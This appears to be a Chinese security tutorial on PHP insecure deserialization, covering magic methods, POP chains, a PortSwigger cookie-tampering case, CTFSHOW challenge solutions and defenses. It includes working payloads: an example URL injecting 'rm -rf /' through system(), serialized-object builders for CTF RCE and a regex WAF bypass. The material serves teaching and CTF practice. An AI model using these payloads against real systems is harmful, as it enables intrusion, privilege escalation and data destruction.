#  第75天-【深度解析】PHP反序列化漏洞：从入门到POP链构造  
原创 Сяо Яо
                    Сяо Яо  AlphaNet   2026-03-09 01:33  
  
在 Web 安全领域，有一类漏洞长期活跃在 **CTF竞赛、漏洞挖掘以及真实攻击事件**  
中，它就是 **不安全的反序列化（Insecure Deserialization）**  
。  
  
  
这种漏洞往往隐藏在程序的深层逻辑中，一旦被攻击者利用，轻则权限绕过，重则直接 **远程代码执行（RCE）**。  
  
  
本文将系统梳理：  
  
- PHP序列化与反序列化原理  
- 魔术方法触发机制  
- 反序列化漏洞形成原因  
- POP链构造逻辑  
- CTF实战案例  
从基础到进阶，完整理解 **PHP反序列化攻击体系**。  
  
  
# 一、序列化与反序列化  
  
  
在理解漏洞之前，需要先理解两个概念：  
  
  
**序列化（Serialization）**  
  
  
将程序中的 **对象结构转换为字符串**，用于：  
  
- 网络传输  
- 文件存储  
- Cookie / Session 保存  
PHP使用函数：  
  
```
serialize()

```  
  
  
**反序列化（Deserialization）**  
  
  
将字符串恢复为对象。  
  
  
PHP使用函数：  
  
```
unserialize()

```  
  
  
可以把这个过程理解为：  
  
```
对象 → 序列化 → 字符串 → 反序列化 → 对象

```  
  
  
## PHP示例  
  
  
为了直观理解，看一个简单例子：  
  
class User {    public $name = 'guest';    public $role = 'user';}$user_obj = new User();$serialized_str = serialize($user_obj);echo $serialized_str;  
  
输出：  
  
```
O:4:"User":2:{s:4:"name";s:5:"guest";s:4:"role";s:4:"user";}

```  
  
  
结构解释：  
  
```
O  → Object
4  → 类名长度
User → 类名
2  → 属性数量

```  
  
  
# 二、PHP魔术方法  
  
  
PHP中存在一类特殊函数：  
  
  
**Magic Methods（魔术方法）**  
  
  
特点：  
  
- 以 __ 开头  
- 在特定场景自动触发  
常见方法如下：  
  
<table><thead><tr><th>方法</th><th>触发条件</th></tr></thead><tbody><tr><td><code>__construct()</code></td><td>创建对象</td></tr><tr><td><code>__destruct()</code></td><td>对象销毁</td></tr><tr><td><code>__wakeup()</code></td><td>反序列化</td></tr><tr><td><code>__sleep()</code></td><td>序列化</td></tr><tr><td><code>__toString()</code></td><td>对象当字符串</td></tr><tr><td><code>__call()</code></td><td>调用不存在方法</td></tr><tr><td><code>__get()</code></td><td>访问不存在属性</td></tr><tr><td><code>__invoke()</code></td><td>对象当函数</td></tr></tbody></table>  
  
在漏洞利用中最关键的是：  
  
```
__wakeup()
__destruct()

```  
  
  
它们经常作为 **POP链入口**。  
  
  
# 三、反序列化漏洞产生原因  
  
  
漏洞产生的根本原因：  
  
  
**程序信任了用户输入的数据。**  
  
  
例如：  
  
class B {    public $cmd = '';public function __destruct() {    system($this->cmd);}}unserialize($_GET['x']);  
  
如果攻击者控制 x 参数：  
  
```
http://example.com/vuln.php?x=O:1:"B":1:{s:3:"cmd";s:10:"rm -rf /";}

```  
  
  
执行流程：  
  
```
unserialize()
      ↓
创建对象 B
      ↓
cmd = "rm -rf /"
      ↓
脚本结束
      ↓
__destruct() 触发
      ↓
system("rm -rf /")

```  
  
  
最终执行系统命令。  
  
  
这就是 **反序列化 → RCE** 的最基础利用。  
  
  
# 四、POP链原理  
  
  
现实项目中，开发者很少把危险函数直接写进魔术方法。  
  
  
因此攻击者需要 **构造调用链**。  
  
  
这种技术叫：  
  
  
**POP（Property Oriented Programming）**  
  
  
核心思想：  
  
  
通过 **控制对象属性**，触发一系列函数调用。  
  
  
结构通常如下：  
  
```
魔术方法
   ↓
中间类方法
   ↓
继续调用
   ↓
危险函数

```  
  
  
POP链组成：  
  
<table><thead><tr><th>组件</th><th>作用</th></tr></thead><tbody><tr><td>Start</td><td>魔术方法</td></tr><tr><td>Gadget</td><td>中间跳板</td></tr><tr><td>Sink</td><td>危险函数</td></tr></tbody></table>  
  
危险函数常见：  
  
```
system()
exec()
eval()
file_put_contents()
include()

```  
  
  
攻击的核心就是：  
  
  
**寻找 Gadget 并拼接调用路径。**  
  
  
# 五、黑盒测试案例（PortSwigger）  
  
  
在黑盒测试中没有源码，只能观察请求。  
  
  
例如某站点 Cookie：  
  
```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}

```  
  
  
字段：  
  
```
admin = false

```  
  
  
攻击者只需要修改：  
  
```
admin → true

```  
  
  
结果：  
  
```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}

```  
  
  
即可获得管理员权限。  
  
  
# 六、CTFSHOW 实战  
  
## Web255  
  
  
目标：  
  
  
成为 VIP。  
  
  
源码发现：  
  
```
$isVip

```  
  
  
构造 payload：  
  
class ctfShowUser{    public $isVip = true;}$a = new ctfShowUser();echo urlencode(serialize($a));  
  
最终 Cookie：  
  
```
user=O:11:"ctfShowUser":3:{...}

```  
  
  
## Web257  
  
  
出现新的类：  
  
```
backDoor

```  
  
  
构造对象嵌套：  
  
class backDoor {    public $code = 'system("tac flag.php");';}class ctfShowUser {public $class;public function __construct() {    $this->class = new backDoor();}}echo urlencode(serialize(new ctfShowUser()));  
  
生成 Payload：  
  
```
ctfShowUser
   ↓
backDoor
   ↓
system()

```  
  
  
成功读取 flag。  
  
  
## Web258：WAF绕过  
  
  
服务器存在过滤：  
  
```
preg_match('/O:\d+:/', $str)

```  
  
  
解决方法：  
  
```
O:+11

```  
  
  
PHP仍然会解析为：  
  
```
O:11

```  
  
  
绕过示例：  
  
$a = serialize(new ctfShowUser());$b = str_replace(':11', ':+11', $a);$c = str_replace(':8', ':+8', $b);echo urlencode($c);  
  
# 七、安全防御  
  
  
开发者可以从以下方面防御：  
  
### 1 禁止反序列化用户数据  
  
  
不要直接：  
  
```
unserialize($_POST)

```  
  
  
### 2 使用 allowed_classes  
  
```
unserialize($data, ["allowed_classes" => false]);

```  
  
  
### 3 使用 JSON 替代  
  
  
推荐：  
  
```
json_encode()
json_decode()

```  
  
  
### 4 避免魔术方法执行危险逻辑  
  
  
不要在：  
  
```
__destruct()
__wakeup()

```  
  
  
中执行敏感操作。  
  
  
# 八、总结  
  
  
PHP反序列化漏洞的核心逻辑可以概括为：  
  
```
用户输入
   ↓
反序列化
   ↓
触发魔术方法
   ↓
POP链调用
   ↓
危险函数执行

```  
  
  
关键知识点：  
  
  
1️⃣ serialize() 与 unserialize()2️⃣ 魔术方法触发机制3️⃣ POP链构造逻辑4️⃣ 属性控制攻击5️⃣ WAF绕过技巧  
  
  
在真实漏洞挖掘中，反序列化漏洞往往与：  
  
- 文件包含  
- 命令执行  
- SSRF  
- 权限绕过  
组合使用，威力极大。  
  
